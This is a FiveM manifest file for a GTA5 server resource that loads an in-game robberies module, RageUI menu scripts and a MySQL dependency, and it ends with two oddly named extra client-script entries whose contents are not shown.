fx_version 'adamant'
game 'gta5'
version '1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',

	"modules/robberies/config.lua",
	"modules/robberies/server.lua",

}

client_scripts {
	-- RageUI Version 1
	"src/client/RMenu.lua",
    "src/client/menu/RageUI.lua",
    "src/client/menu/Menu.lua",
    "src/client/menu/MenuController.lua",
    "src/client/components/*.lua",
    "src/client/menu/elements/*.lua",
    "src/client/menu/items/*.lua",
    "src/client/menu/panels/*.lua",
	"src/client/menu/windows/*.lua",
	
	-- 
	"client_main.lua",

	"modules/robberies/config.lua",
	"modules/robberies/client.lua",

}

dependencies {
	'mysql-async'
}

client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'